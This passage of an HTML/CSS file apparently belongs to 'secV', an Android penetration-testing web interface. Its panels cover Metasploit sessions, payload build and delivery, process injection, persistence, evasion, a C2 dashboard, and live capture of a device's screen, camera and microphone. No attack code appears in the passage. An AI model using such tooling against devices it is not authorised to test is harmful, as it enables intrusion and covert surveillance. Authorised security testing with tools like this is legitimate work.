  font-family:var(--mono);font-size:0.7rem;color:var(--accent);word-break:break-all;
  background:var(--bg2);border:1px solid var(--border2);padding:6px 10px;margin:4px 0;
}
.pd-info{
  font-size:0.64rem;color:var(--muted);padding:6px 10px;
  background:var(--bg2);border-left:2px solid var(--border2);line-height:1.6;
}
.pd-qr-area{display:flex;gap:10px;flex-wrap:wrap;}
.pd-qr-card{background:var(--bg1);border:1px solid var(--border2);padding:11px 13px;flex:1;min-width:200px;}
.pd-qr-pre{color:var(--green);font-size:0.58rem;line-height:1.0;overflow-x:auto;}
.pd-sess-list{display:flex;flex-direction:column;gap:4px;}
.pd-sess-row{
  display:flex;align-items:center;gap:9px;background:var(--bg2);
  border:1px solid var(--border2);padding:7px 11px;transition:border-color var(--t);
}
.pd-sess-row:hover{border-color:var(--border3);}
.pd-sess-row.active-sess{border-color:var(--accent);}
.pd-sess-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.pd-sess-dot.running{animation:pulse .8s infinite;}
.pd-sess-info{flex:1;display:flex;flex-direction:column;gap:2px;overflow:hidden;}
.pd-sess-id{font-size:0.7rem;color:var(--white);font-weight:600;}
.pd-sess-meta{font-size:0.58rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.pd-sess-acts{display:flex;gap:4px;flex-shrink:0;}
.pd-sa{font-family:var(--mono);font-size:0.56rem;padding:2px 7px;border:1px solid var(--border2);background:none;color:var(--muted);cursor:pointer;transition:all var(--t);}
.pd-sa:hover{color:var(--white);border-color:var(--border3);}
.pd-sa.kill{border-color:var(--red);color:var(--red);}
.pd-sa.kill:hover{background:var(--red-dim);}
.pd-sa.accent{border-color:var(--accent);color:var(--accent);}
.pd-sa.accent:hover{background:var(--accent-dim);}
.pd-status-badge{
  font-size:0.56rem;letter-spacing:0.1em;text-transform:uppercase;
  padding:2px 8px;border:1px solid var(--border2);color:var(--muted);
}
.pd-status-badge.ready{border-color:var(--green);color:var(--green);}
.pd-status-badge.running{border-color:var(--accent);color:var(--accent);animation:pulse .9s infinite;}

/* ── MSF CONSOLE TAB ─────────────────────────────────────────────────── */
#msf-console-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
.msfc-toolbar{
  display:flex;align-items:center;gap:6px;padding:5px 12px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
}
.msfc-toolbar .pd-btn{padding:3px 10px;font-size:0.6rem;}
#msf2-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0;}
#msf2-dot.on{background:var(--green);box-shadow:0 0 6px var(--green);}
#msf2-status{font-size:0.6rem;color:var(--muted);letter-spacing:0.08em;}
#msf2-status.on{color:var(--green);}
#msf2-terminal{
  flex:1;overflow-y:auto;padding:10px 14px;background:rgba(6,6,6,0.72);
  font-family:var(--mono);font-size:0.75rem;line-height:1.75;
  white-space:pre-wrap;word-break:break-all;
}
#msf2-input-row{
  display:flex;gap:8px;padding:8px 14px;background:var(--bg1);
  border-top:1px solid var(--border2);align-items:center;flex-shrink:0;
}
#msf2-prompt{color:var(--red);font-size:0.75rem;white-space:nowrap;font-family:var(--mono);}
#msf2-input{
  flex:1;background:transparent;border:none;color:var(--white);
  font-family:var(--mono);font-size:0.75rem;outline:none;
}

/* ── SESSION DRAWER ───────────────────────────────────────────────────── */
#sess-drawer{
  position:fixed !important;top:0;right:-380px;width:380px;height:100vh;
  background:rgba(8,8,8,0.97);border-left:1px solid var(--border2);
  z-index:200;transition:right 0.22s ease;display:flex;flex-direction:column;
  backdrop-filter:blur(14px);
}
#sess-drawer.open{right:0;}
#sess-drawer-overlay{position:fixed !important;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.45);z-index:199;display:none;}
#sess-drawer-overlay.show{display:block;}
.sd-hdr{display:flex;align-items:center;gap:10px;padding:14px 16px;border-bottom:1px solid var(--border2);flex-shrink:0;}
.sd-title{font-size:0.7rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--silver);font-weight:600;flex:1;}
.sd-close{background:none;border:none;color:var(--muted);font-size:1.1rem;cursor:pointer;padding:0 4px;transition:color var(--t);}
.sd-close:hover{color:var(--white);}
.sd-body{flex:1;overflow-y:auto;padding:12px 14px;}
.sd-sect{font-size:0.58rem;letter-spacing:0.14em;text-transform:uppercase;color:var(--muted);margin:10px 0 6px;}
.sd-row{
  display:flex;align-items:center;gap:8px;padding:8px 10px;
  border:1px solid var(--border2);background:var(--bg1);margin-bottom:5px;
  cursor:pointer;transition:all var(--t);
}
.sd-row:hover{border-color:var(--border3);background:var(--bg2);}
.sd-row.active-sd{border-color:var(--accent);}
.sd-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.sd-dot.running{animation:pulse .8s infinite;}
.sd-info{flex:1;overflow:hidden;}
.sd-top{display:flex;align-items:center;gap:6px;}
.sd-id{font-size:0.72rem;color:var(--white);font-weight:600;}
.sd-op{font-size:0.6rem;color:var(--accent);background:var(--accent-dim);padding:1px 5px;}
.sd-dev{font-size:0.6rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
.sd-acts{display:flex;gap:4px;flex-shrink:0;}
.sd-act{font-family:var(--mono);font-size:0.57rem;padding:2px 7px;border:1px solid var(--border2);background:none;color:var(--muted);cursor:pointer;transition:all var(--t);}
.sd-act:hover{color:var(--white);border-color:var(--border3);}
.sd-act.kill{border-color:var(--red);color:var(--red);}
.sd-act.kill:hover{background:var(--red-dim);}
.sd-act.accent{border-color:var(--accent);color:var(--accent);}
.sd-act.accent:hover{background:var(--accent-dim);}
#sess-label{cursor:pointer;user-select:none;}
#sess-label:hover{color:var(--white);}
#sess-count{cursor:pointer;user-select:none;}
#sess-count:hover{color:var(--white);}
.sd-drawer-btn{
  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.08em;text-transform:uppercase;
  padding:5px 12px;border:1px solid var(--border2);background:none;color:var(--muted);cursor:pointer;margin-left:auto;
}
.sd-drawer-btn:hover{color:var(--white);border-color:var(--border3);}

/* SETUP/DEPS TAB */
#setup-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
.dep-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1px;
  background:var(--border2);border:1px solid var(--border2);margin-bottom:16px;}
.dep-card{
  background:var(--bg1);padding:12px 14px;display:flex;align-items:center;gap:10px;
}
.dep-card .dep-dot{width:6px;height:6px;flex-shrink:0;}
.dep-card .dep-dot.ok{background:var(--green);}
.dep-card .dep-dot.miss{background:var(--red);}
.dep-card .dep-name{font-size:0.75rem;color:var(--white);flex:1;}
.dep-card .dep-install{font-size:0.6rem;color:var(--muted);margin-top:2px;}
.settings-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:10px;margin-top:12px;}
.settings-grid .field{min-width:unset;}
#save-settings{
  background:var(--white);color:var(--bg);border:none;padding:7px 18px;
  font-family:var(--disp);font-size:0.72rem;font-weight:700;letter-spacing:0.06em;
  text-transform:uppercase;cursor:pointer;margin-top:12px;transition:background var(--t);
}
#save-settings:hover{background:var(--off);}

/* FILES TAB — dual-pane manager */
#files-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
#fm-toolbar{
  display:flex;align-items:center;gap:6px;padding:6px 12px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
}
.fm-tb-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  padding:4px 12px;font-family:var(--mono);font-size:0.6rem;letter-spacing:0.07em;
  text-transform:uppercase;cursor:pointer;transition:all var(--t);white-space:nowrap;
}
.fm-tb-btn:hover,.fm-tb-btn.active{color:var(--white);border-color:var(--border3);}
.fm-tb-btn.danger:hover{color:var(--red);border-color:var(--red);}
.fm-tb-btn.go{background:var(--white);color:var(--bg);border-color:var(--white);}
.fm-tb-btn.go:hover{background:var(--off);}
#fm-body{display:flex;flex:1;overflow:hidden;gap:0;}
.fm-pane{display:flex;flex-direction:column;flex:1;overflow:hidden;border-right:1px solid var(--border2);}
.fm-pane:last-child{border-right:none;}
.fm-pane-hdr{
  display:flex;align-items:center;gap:6px;padding:5px 10px;
  background:var(--bg2);border-bottom:1px solid var(--border);flex-shrink:0;
  font-size:0.58rem;letter-spacing:0.12em;text-transform:uppercase;color:var(--muted);
}
.fm-pane-hdr .fm-pane-title{color:var(--white);font-weight:700;}
.fm-breadcrumb{
  display:flex;align-items:center;gap:3px;padding:4px 10px;
  background:var(--bg1);border-bottom:1px solid var(--border);flex-shrink:0;
  font-size:0.62rem;overflow-x:auto;white-space:nowrap;
}
.fm-bc-seg{color:var(--muted);cursor:pointer;padding:1px 3px;border-radius:2px;}
.fm-bc-seg:hover{color:var(--white);background:var(--bg3);}
.fm-bc-sep{color:var(--border3);}
.fm-list{flex:1;overflow-y:auto;}
.fm-entry{
  display:flex;align-items:center;gap:8px;padding:6px 10px;
  border-bottom:1px solid var(--border);font-size:0.7rem;cursor:pointer;
  transition:background var(--t);user-select:none;
}
.fm-entry:hover{background:var(--bg2);}
.fm-entry.selected{background:rgba(255,255,255,0.06);}
.fm-entry.fm-dir .fm-ico{color:var(--yellow);}
.fm-entry.fm-file .fm-ico{color:var(--muted);}
.fm-entry.fm-apk .fm-ico{color:var(--green);}
.fm-ico{width:14px;flex-shrink:0;font-style:normal;font-size:0.75rem;}
.fm-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:var(--white);}
.fm-size{color:var(--muted);white-space:nowrap;font-size:0.6rem;min-width:52px;text-align:right;}
.fm-perms{color:var(--muted);white-space:nowrap;font-size:0.58rem;font-family:var(--mono);}
.fm-ctx{
  position:fixed;z-index:9999;background:var(--bg2);border:1px solid var(--border2);
  padding:4px 0;min-width:180px;font-size:0.68rem;box-shadow:0 4px 18px rgba(0,0,0,0.5);
}
.fm-ctx-item{padding:7px 16px;cursor:pointer;color:var(--grey);transition:all var(--t);}
.fm-ctx-item:hover{background:var(--bg3);color:var(--white);}
.fm-ctx-item.danger{color:var(--red);}
.fm-ctx-sep{border-top:1px solid var(--border);margin:3px 0;}
#fm-preview{
  width:320px;flex-shrink:0;display:flex;flex-direction:column;
  border-left:1px solid var(--border2);overflow:hidden;
}
#fm-preview-hdr{
  padding:6px 10px;background:var(--bg2);border-bottom:1px solid var(--border);
  font-size:0.6rem;letter-spacing:0.1em;text-transform:uppercase;color:var(--muted);flex-shrink:0;
}
#fm-preview-content{flex:1;overflow-y:auto;padding:10px 12px;font-size:0.68rem;line-height:1.7;}
.fm-prev-meta{color:var(--muted);font-size:0.6rem;margin-bottom:10px;}
.fm-prev-text{font-family:var(--mono);font-size:0.65rem;white-space:pre-wrap;word-break:break-all;color:var(--grey);}
.fm-prev-actions{display:flex;flex-wrap:wrap;gap:5px;margin-top:10px;}
.fm-status{
  padding:3px 10px;background:var(--bg2);border-top:1px solid var(--border);
  font-size:0.58rem;color:var(--muted);flex-shrink:0;letter-spacing:0.04em;
}
.fm-empty{padding:20px;color:var(--muted);font-size:0.68rem;text-align:center;}
.fm-apk-badge{
  background:rgba(76,175,80,0.15);border:1px solid rgba(76,175,80,0.3);
  color:var(--green);padding:1px 5px;font-size:0.55rem;border-radius:2px;
  letter-spacing:0.06em;text-transform:uppercase;
}

/* C2 PANEL */
#c2-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
#c2-toolbar{
  display:flex;align-items:center;gap:10px;padding:10px 16px;
  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;
}
#c2-toolbar span{color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;text-transform:uppercase;}
#c2-port-inp{
  width:64px;background:var(--bg2);border:1px solid var(--border2);
  color:var(--white);font-family:var(--mono);font-size:0.75rem;padding:5px 8px;
}
.c2-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  padding:5px 14px;font-family:var(--mono);font-size:0.65rem;letter-spacing:0.08em;
  text-transform:uppercase;cursor:pointer;transition:all var(--t);
}
.c2-btn:hover{color:var(--white);border-color:var(--border3);}
.c2-btn.launch{background:var(--white);color:var(--bg);border-color:var(--white);}
.c2-btn.launch:hover{background:var(--off);}
.c2-btn.stop{border-color:rgba(229,57,53,0.4);color:var(--red);}
.c2-btn.stop:hover{background:var(--red-dim);border-color:var(--red);}
#c2-frame-wrap{flex:1;overflow:hidden;background:rgba(6,6,6,0.75);}
#c2-placeholder{
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  height:100%;color:var(--muted);gap:14px;
}
#c2-placeholder .c2-icon{
  font-family:var(--disp);font-size:3rem;font-weight:800;
  color:var(--bg4);letter-spacing:-0.06em;
}
#c2-placeholder .c2-title{font-family:var(--disp);font-size:1.1rem;font-weight:700;color:var(--grey);}
#c2-placeholder .c2-hint{font-size:0.68rem;color:var(--muted);}
#c2-iframe{display:none;width:100%;height:100%;border:none;}

/* STATUS BAR */
#statusbar{
  display:flex;align-items:center;gap:10px;padding:6px 16px;
  background:var(--bg1);border-top:1px solid var(--border2);flex-shrink:0;
  font-size:0.6rem;letter-spacing:0.08em;text-transform:uppercase;color:var(--muted);
  position:relative;overflow:hidden;
}
#status-dot{width:5px;height:5px;background:var(--muted);transition:background var(--t),box-shadow var(--t);}
#status-dot.active{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse .9s infinite;}
#status-text{flex:1;color:var(--grey);}
#status-time{color:var(--muted);}
#workdir-link{color:var(--muted);cursor:pointer;transition:color var(--t);}
#workdir-link:hover{color:var(--white);}

/* PROGRESS BAR */
#progress-bar{
  position:absolute;bottom:0;left:0;height:2px;width:0%;
  background:var(--white);transition:width .4s ease,opacity .3s;opacity:0;
}
#progress-bar.active{opacity:1;animation:progress-indeterminate 1.6s linear infinite;}
@keyframes progress-indeterminate{
  0%  {left:-40%;width:40%;}
  50% {left:30%;width:60%;}
  100%{left:100%;width:40%;}
}

/* TERMINAL LINE ANIMATION */
@keyframes fadeSlideIn{
  from{opacity:0;transform:translateY(3px);}
  to  {opacity:1;transform:translateY(0);}
}
#terminal .ln{animation:fadeSlideIn .1s ease both;}

/* RUN BUTTON STATES */
#run-btn.running{
  background:var(--bg4);color:var(--muted);cursor:not-allowed;
  animation:runPulse 1s infinite;
}
@keyframes runPulse{0%,100%{opacity:1}50%{opacity:.5}}

/* TOAST NOTIFICATIONS */
#toast-container{
  position:fixed;bottom:48px;right:16px;z-index:9999;
  display:flex;flex-direction:column-reverse;gap:6px;pointer-events:none;
}
.toast{
  background:var(--bg3);border:1px solid var(--border2);
  padding:8px 14px;font-family:var(--mono);font-size:0.65rem;
  letter-spacing:0.04em;color:var(--white);max-width:320px;
  animation:toastIn .2s ease both;
}
.toast.connect{border-left:2px solid var(--green);}
.toast.disconnect{border-left:2px solid var(--red);}
.toast.info{border-left:2px solid var(--blue);}
@keyframes toastIn{from{opacity:0;transform:translateX(12px);}to{opacity:1;transform:translateX(0);}}
@keyframes toastOut{from{opacity:1;}to{opacity:0;transform:translateX(12px);}}

/* TOPBAR ACCENT */
#topbar::after{
  content:'';position:absolute;left:0;bottom:0;height:1px;width:100%;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,0.04),transparent);
  pointer-events:none;
}
#topbar{position:relative;}

/* PARAMS PANEL TRANSITION */
#params-panel{transition:opacity .12s ease;}
#params-panel.switching{opacity:0;}

/* SIDEBAR HOVER ACCENT */
.op-item::before{
  content:'';position:absolute;left:0;top:0;height:100%;width:2px;
  background:var(--white);transform:scaleY(0);transition:transform .14s ease;
}
.op-item{position:relative;}
.op-item:hover::before{transform:scaleY(0.6);}
.op-item.active::before{transform:scaleY(1);}

/* DEVBADGE CONNECTED PULSE */
#topbar .devbadge.connected #dev-dot{
  animation:devPulse 2.4s ease-in-out infinite;
}
@keyframes devPulse{
  0%,100%{box-shadow:0 0 4px var(--green);}
  50%    {box-shadow:0 0 10px var(--green),0 0 20px rgba(76,175,80,0.3);}
}

/* ── LIVE MEDIA PANEL ─────────────────────────────────────────────────────── */
#live-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;gap:14px;}

/* Screen mirror */
.live-section{background:var(--bg1);border:1px solid var(--border2);}
.live-section-hdr{
  display:flex;align-items:center;gap:10px;padding:8px 14px;
  border-bottom:1px solid var(--border2);
}
.live-section-hdr .live-label{
  font-family:var(--disp);font-size:0.7rem;font-weight:700;
  color:var(--white);letter-spacing:0.06em;text-transform:uppercase;flex:1;
}
.live-section-hdr .live-dot{
  width:6px;height:6px;background:var(--muted);
  transition:background var(--t),box-shadow var(--t);
}
.live-section-hdr .live-dot.on{background:var(--red);box-shadow:0 0 6px var(--red);
  animation:recPulse 1s infinite;}
@keyframes recPulse{0%,100%{opacity:1}50%{opacity:.3}}
.live-btn{
  background:none;border:1px solid var(--border2);color:var(--muted);
  padding:4px 12px;font-family:var(--mono);font-size:0.6rem;
  letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
  transition:all var(--t);
}
.live-btn:hover{color:var(--white);border-color:var(--border3);}
.live-btn.active{background:var(--red-dim);color:var(--red);border-color:rgba(229,57,53,0.5);}
.live-btn.go{background:var(--white);color:var(--bg);border-color:var(--white);}
.live-btn.go:hover{background:var(--off);}
.live-select{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.65rem;padding:4px 6px;
}
.live-input{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.65rem;padding:4px 8px;width:70px;
}
#screen-wrap{
  position:relative;background:#000;display:flex;
  align-items:center;justify-content:center;min-height:200px;
  transition:height 0.3s ease;
}
#screen-wrap.sized{
  /* height set dynamically via JS using detected aspect ratio */
  min-height:unset;
}
#screen-img{
  width:100%;height:100%;object-fit:contain;display:none;
  position:absolute;top:0;left:0;
}
#screen-placeholder{
  color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
  text-transform:uppercase;padding:40px;text-align:center;
}
#screen-overlay{
  position:absolute;top:6px;right:6px;
  background:rgba(0,0,0,0.7);padding:3px 8px;
  font-size:0.55rem;color:var(--green);letter-spacing:0.1em;display:none;
}

/* Camera + Audio grid */
.live-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
@media(max-width:800px){.live-grid{grid-template-columns:1fr;}}
#camera-img{max-width:100%;max-height:260px;object-fit:contain;display:none;}
#camera-placeholder{
  color:var(--muted);font-size:0.65rem;letter-spacing:0.08em;
  text-transform:uppercase;padding:30px;text-align:center;
}
.camera-wrap{background:#000;display:flex;align-items:center;justify-content:center;min-height:140px;}

/* Audio */
.audio-row{
  display:flex;align-items:center;gap:10px;padding:10px 14px;
  border-bottom:1px solid var(--border);
}
.audio-row:last-child{border-bottom:none;}
.audio-label{color:var(--grey);font-size:0.62rem;letter-spacing:0.1em;text-transform:uppercase;flex:0 0 80px;}
#mic-visualizer{
  flex:1;height:28px;background:var(--bg2);border:1px solid var(--border);
  overflow:hidden;display:flex;align-items:center;gap:1px;padding:0 4px;
}
.mic-bar{width:3px;background:var(--green);transition:height .08s;}
#mic-audio{width:100%;margin-top:4px;display:none;}
.speaker-file{
  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
  font-family:var(--mono);font-size:0.65rem;padding:4px 8px;flex:1;cursor:pointer;
}

/* MSF Console */
#msf-terminal{
  flex:1;min-height:200px;max-height:320px;overflow-y:auto;
  padding:10px 14px;background:var(--bg);
  font-family:var(--mono);font-size:0.72rem;line-height:1.75;
  white-space:pre-wrap;word-break:break-all;
}
#msf-input-row{
  display:flex;gap:8px;padding:8px 14px;background:var(--bg1);
  border-top:1px solid var(--border2);align-items:center;
}
#msf-input-row span{color:var(--red);font-size:0.72rem;}
#msf-input{
  flex:1;background:transparent;border:none;color:var(--white);
  font-family:var(--mono);font-size:0.72rem;outline:none;
}
#msf-status{font-size:0.58rem;letter-spacing:0.1em;color:var(--muted);}
#msf-status.on{color:var(--green);}
</style>
</head>
<body>
<canvas id="code-bg"></canvas>

<!-- TOP BAR -->
<div id="topbar">
  <div class="logo">secV<span class="logo-sep">/</span><span class="logo-sub">android pentest</span></div>
  <div class="devbadge" id="devbadge">
    <div id="dev-dot"></div>
    <div id="dev-name">no device</div>
    <div id="dev-os"></div>
  </div>
  <span id="lhost-display"></span>
  <span id="dev-count" style="font-size:0.58rem;color:var(--muted);letter-spacing:0.1em;"></span>
  <button class="tb-btn" id="sidebar-toggle-btn" onclick="toggleSidebar()" title="Toggle ops sidebar"><svg width="15" height="12" viewBox="0 0 15 12" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><rect width="4" height="12" rx="1" opacity="0.55"/><rect x="6" width="9" height="3.5" rx="1"/><rect x="6" y="4.25" width="9" height="3.5" rx="1"/><rect x="6" y="8.5" width="9" height="3.5" rx="1"/></svg>ops</button>
  <button class="tb-btn" onclick="refreshDevices()" title="Poll for devices"><svg width="13" height="13" viewBox="0 0 13 13" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg"><path d="M11 2v3.5H7.5"/><path d="M2 11V7.5H5.5"/><path d="M3.3 5A4.5 4.5 0 0 1 11 6"/><path d="M9.7 8A4.5 4.5 0 0 1 2 7"/></svg>refresh</button>
  <button class="tb-btn" id="reload-btn" onclick="forceReloadADB()" title="Kill + restart ADB server"><svg width="11" height="14" viewBox="0 0 11 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><polygon points="7,0 0,8 4.5,8 3.5,14 11,6 6.5,6"/></svg>reload adb</button>
  <button class="tb-btn" onclick="clearTerminal()" title="Clear terminal output"><svg width="12" height="13" viewBox="0 0 12 13" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg"><line x1="1" y1="2.5" x2="11" y2="2.5"/><path d="M4 2.5V1.5h4v1"/><path d="M2 2.5l.7 8a1 1 0 0 0 1 .9h4.6a1 1 0 0 0 1-.9l.7-8"/><line x1="4.5" y1="5" x2="4.7" y2="9"/><line x1="7.5" y1="5" x2="7.3" y2="9"/></svg>clear</button>
  <button class="tb-btn" onclick="switchTab('setup')" title="Open setup &amp; dependencies"><svg width="14" height="14" viewBox="0 0 14 14" fill="none" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg"><circle cx="7" cy="7" r="2.2"/><path d="M7 1.2V2.6M7 11.4V12.8M1.2 7H2.6M11.4 7H12.8M3 3L4 4M10 10L11 11M11 3L10 4M3 11L4 10"/></svg>setup</button>
  <button class="tb-btn" id="kill-btn" onclick="killOp()" title="Kill running operation"><svg width="12" height="12" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" xmlns="http://www.w3.org/2000/svg"><line x1="2" y1="2" x2="10" y2="10"/><line x1="10" y1="2" x2="2" y2="10"/></svg>kill</button>
</div>

<!-- SESSIONS BAR -->
<div id="sessions-bar">
  <span id="sess-label" onclick="toggleSessionDrawer()" title="Click to manage sessions">Sessions</span>
  <span id="sess-count" onclick="toggleSessionDrawer()" title="Click to manage sessions"></span>
  <button class="sd-drawer-btn" onclick="toggleSessionDrawer()" title="Open session manager">≡ manage</button>
</div>

<!-- SESSION DRAWER -->
<div id="sess-drawer-overlay" onclick="closeSessionDrawer()"></div>
<div id="sess-drawer">
  <div class="sd-hdr">
    <span class="sd-title">Session Manager</span>
    <button class="sd-act accent" onclick="pdStartHandler()" style="padding:4px 12px;font-size:0.6rem;">⚡ handler</button>
    <button class="sd-close" onclick="closeSessionDrawer()">×</button>
  </div>
  <div class="sd-body">
    <div class="sd-sect">secV Operations</div>
    <div id="sd-secv-list"><div style="color:var(--muted);font-size:0.65rem;">No sessions yet.</div></div>
    <div class="sd-sect" style="margin-top:14px">MSF Meterpreter</div>
    <div id="sd-msf-list"><div style="color:var(--muted);font-size:0.65rem;">Start msfconsole first.</div></div>
    <div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap;">
      <button class="sd-act" onclick="pdRefreshMsfSessions()">⟳ refresh MSF</button>
      <button class="sd-act" onclick="switchTab('msf-console');closeSessionDrawer()">⬛ MSF console</button>
      <button class="sd-act kill" onclick="pdKillAll()">✕ kill all</button>
    </div>
  </div>
</div>

<!-- APK FILE BROWSER MODAL -->
<div id="apk-browser-overlay" onclick="apkBrowserBgClick(event)">
  <div id="apk-browser-modal">
    <div id="apk-browser-header">
      <span id="apk-browser-title">select apk</span>
      <span id="apk-browser-path"></span>
      <button id="apk-browser-close" onclick="apkBrowserClose()">×</button>
    </div>
    <div id="apk-browser-toolbar">
      <button id="apk-browser-up" onclick="apkBrowserUp()">↑ up</button>
      <input id="apk-browser-filter" type="text" placeholder="filter…" oninput="apkBrowserFilter()" autocomplete="off">
    </div>
    <div id="apk-browser-list">
      <div id="apk-browser-loading">loading…</div>
      <div id="apk-browser-empty">no entries</div>
    </div>
  </div>
</div>

<!-- MAIN -->
<div id="main">
  <!-- SIDEBAR -->
  <div id="sidebar">
    <div id="dev-selector">
      <select id="dev-select" onchange="onDeviceChange()">
        <option value="">-- device --</option>
      </select>
      <button onclick="loadAppList()">↓ load apps</button>
    </div>
    <div id="op-groups"></div>
  </div>

  <!-- RIGHT -->
  <div id="right">
    <!-- PARAMS -->
    <div id="params-panel">
      <div class="op-title" id="op-title" style="display:none"></div>
      <div class="op-desc" id="op-desc" style="display:none"></div>
      <div id="params-placeholder" class="params-placeholder">
        <div class="pp-title">secV · android pentest</div>
        <div class="pp-hint">Open <b style="color:var(--white)">⊟ ops</b> in the topbar to show the operation list, or switch to <b style="color:var(--white)">P&amp;D</b> to build and deliver payloads.</div>
        <div class="pp-cats">
          <span class="pp-cat" style="color:var(--cat-recon);border-color:var(--cat-recon)">recon</span>
          <span class="pp-cat" style="color:var(--cat-access);border-color:var(--cat-access)">access</span>
          <span class="pp-cat" style="color:var(--cat-payload);border-color:var(--cat-payload)">payload</span>
          <span class="pp-cat" style="color:var(--cat-instr);border-color:var(--cat-instr)">instrumentation</span>
          <span class="pp-cat" style="color:var(--cat-persist);border-color:var(--cat-persist)">persistence</span>
          <span class="pp-cat" style="color:var(--cat-c2);border-color:var(--cat-c2)">c2</span>
          <span class="pp-cat" style="color:var(--cat-evasion);border-color:var(--cat-evasion)">evasion</span>
          <span class="pp-cat" style="color:var(--cat-auto);border-color:var(--cat-auto)">auto chains</span>
        </div>
      </div>
      <div id="params-form"></div>
      <!-- PROCESS SNIFFER PANEL (shown only for process_inject) -->
      <div id="proc-sniff-panel">
        <div class="ps-toolbar">
          <span style="font-family:var(--mono);font-size:0.64rem;color:var(--muted);letter-spacing:0.06em;white-space:nowrap;">LIVE PROCESSES</span>
          <input id="ps-filter" class="ps-filter" type="text" placeholder="filter by name or PID…" oninput="onPsFilter()">
          <button class="ps-btn" id="ps-toggle-btn" onclick="toggleProcStream()">▶ stream</button>
          <button class="ps-btn" onclick="refreshProcs()">↺ refresh</button>
          <span class="ps-count" id="ps-count">0 procs</span>
        </div>
        <table id="proc-table">
          <thead><tr>
            <th>PID</th><th>PPID</th><th>USER</th><th>S</th><th>PROCESS NAME</th>
          </tr></thead>
          <tbody id="proc-tbody"></tbody>
        </table>
      </div>
    </div>

    <!-- TABS -->
    <div id="tabs">
      <div class="tab active" onclick="switchTab('terminal')">Terminal</div>
      <div class="tab" onclick="switchTab('adb')">ADB Shell</div>
      <div class="tab" onclick="switchTab('shell')">Shell <span id="shell-badge" class="badge" style="display:none">●</span></div>
      <div class="tab" onclick="switchTab('findings')">Findings <span id="findings-badge" class="badge" style="display:none">0</span></div>
      <div class="tab" onclick="switchTab('pd')">P&amp;D <span id="pd-badge" class="badge" style="display:none">●</span></div>
      <div class="tab" onclick="switchTab('msf-console')">MSF <span id="msf-badge" class="badge" style="display:none">●</span></div>
      <div class="tab" onclick="switchTab('files')">Files</div>
      <div class="tab" onclick="switchTab('setup')">Setup/Deps</div>
      <div class="tab" id="c2-tab" onclick="switchTab('c2')">C2 Dashboard</div>
      <div class="tab" id="live-tab" onclick="switchTab('live')">Live Media <span id="live-badge" class="badge" style="display:none">●</span></div>
    </div>

    <!-- TERMINAL TAB -->
    <div id="terminal-wrap">
      <div id="term-toolbar">
        <button class="tt-btn" onclick="clearTerminal()">⌧ clear</button>
        <div class="tt-sep"></div>
        <button class="tt-btn" id="term-find-btn" onclick="toggleFindBar()" title="Ctrl+F">⌕ find</button>
        <div id="term-find-bar">
          <input id="term-find-inp" type="text" placeholder="search…" oninput="termFindUpdate()" onkeydown="termFindKey(event)" autocomplete="off">
          <button class="tt-btn" onclick="termFindPrev()" title="Previous">↑</button>
          <button class="tt-btn" onclick="termFindNext()" title="Next">↓</button>
          <span id="term-find-count"></span>
          <button class="tt-btn" onclick="closeFindBar()">×</button>
        </div>
        <div class="tt-sep"></div>
        <button class="tt-btn" id="wrap-btn" onclick="toggleWrap()" title="Toggle line wrap">↵ wrap</button>
        <button class="tt-btn active" id="scroll-btn" onclick="toggleAutoScroll()" title="Toggle auto-scroll">⬇ scroll</button>
        <span id="term-line-ct" style="margin-left:auto;font-size:0.58rem;color:var(--muted);">0 lines</span>
      </div>
      <div id="terminal"></div>
    </div>
    <!-- ADB CONSOLE TAB -->
    <div id="adb-console">
      <div id="adb-output"></div>
      <div id="adb-input-row">
        <span>adb&gt;&nbsp;</span>
        <input id="adb-input" type="text" placeholder="shell getprop ro.product.model" onkeydown="adbEnter(event)">
      </div>
    </div>
    <!-- SHELL TAB (PTY) -->
    <div id="shell-panel">
      <div id="shell-toolbar">
        <div id="pty-dot"></div>
        <span id="pty-status">inactive</span>
        <div class="tt-sep"></div>
